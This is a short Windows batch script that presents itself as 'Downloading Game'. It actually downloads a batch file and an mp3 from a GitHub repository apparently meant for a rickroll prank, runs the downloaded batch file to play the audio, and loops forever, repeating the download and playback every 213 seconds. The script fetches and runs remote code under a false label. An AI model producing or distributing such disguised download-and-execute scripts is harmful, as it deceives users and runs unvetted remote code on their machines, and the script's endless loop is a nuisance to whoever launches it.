@echo off

echo Downloading Game

:DOWNLOAD
  mkdir %TEMP%\yompBest
  powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat', '%TEMP%\yompBest\m.bat')"
  powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3', '%TEMP%\yompBest\role.mp3')"
  %TEMP%\yompBest\m %TEMP%\yompBest\role.mp3
  timeout 213
 goto :DOWNLOAD
